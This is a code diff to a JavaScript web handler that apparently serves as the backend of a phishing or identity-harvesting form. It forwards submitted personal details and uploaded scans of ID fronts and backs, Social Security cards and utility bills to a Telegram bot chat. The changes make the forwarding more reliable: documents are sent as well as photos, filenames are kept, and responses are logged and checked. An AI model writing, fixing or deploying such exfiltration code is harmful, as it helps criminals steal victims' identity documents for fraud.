@@ -53,16 +53,26 @@ export default async function handler(req, res) {
 🌍 Place of Birth: ${fields.birthPlace}
 `;
 
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-        }),
-      });
+      const msgRes = await fetch(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+          }),
+        }
+      );
 
-      // ✅ Send files as PHOTOS (previewable in Telegram)
+      const msgData = await msgRes.json();
+      console.log("sendMessage response:", msgData);
+
+      if (!msgRes.ok) {
+        throw new Error(JSON.stringify(msgData));
+      }
+
+      // ✅ Send files (image → sendPhoto, others → sendDocument)
       const fileFields = ["idFront", "idBack", "ssnCard", "utilityBill"];
 
       for (let field of fileFields) {
@@ -71,35 +81,68 @@ export default async function handler(req, res) {
             ? files[field][0]
             : files[field];
 
+          const isImage = file.mimetype?.startsWith("image/");
+
           const formData = new FormData();
           formData.append("chat_id", CHAT_ID);
 
-          // Send as photo instead of document
-          formData.append(
-            "photo",
-            fs.createReadStream(file.filepath),
-            {
-              filename: `${field}.jpg`,
-              contentType: "image/jpeg",
-            }
-          );
+          if (isImage) {
+            formData.append(
+              "photo",
+              fs.createReadStream(file.filepath),
+              {
+                filename: file.originalFilename || `${field}.jpg`,
+              }
+            );
 
-          await fetch(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-            {
-              method: "POST",
-              body: formData,
-              headers: formData.getHeaders(),
+            const tgRes = await fetch(
+              `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+              {
+                method: "POST",
+                body: formData,
+                headers: formData.getHeaders(),
+              }
+            );
+
+            const tgData = await tgRes.json();
+            console.log(`sendPhoto response (${field}):`, tgData);
+
+            if (!tgRes.ok) {
+              throw new Error(JSON.stringify(tgData));
             }
-          );
+          } else {
+            formData.append(
+              "document",
+              fs.createReadStream(file.filepath),
+              {
+                filename: file.originalFilename || field,
+              }
+            );
+
+            const tgRes = await fetch(
+              `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+              {
+                method: "POST",
+                body: formData,
+                headers: formData.getHeaders(),
+              }
+            );
+
+            const tgData = await tgRes.json();
+            console.log(`sendDocument response (${field}):`, tgData);
+
+            if (!tgRes.ok) {
+              throw new Error(JSON.stringify(tgData));
+            }
+          }
         }
       }
 
       return res.status(200).json({ success: true });
 
     } catch (error) {
-      console.error("Telegram error:", error);
-      return res.status(500).json({ error: "Telegram send failed" });
+      console.error("Telegram error FULL:", error);
+      return res.status(500).json({ error: error.message });
     }
   });
 }
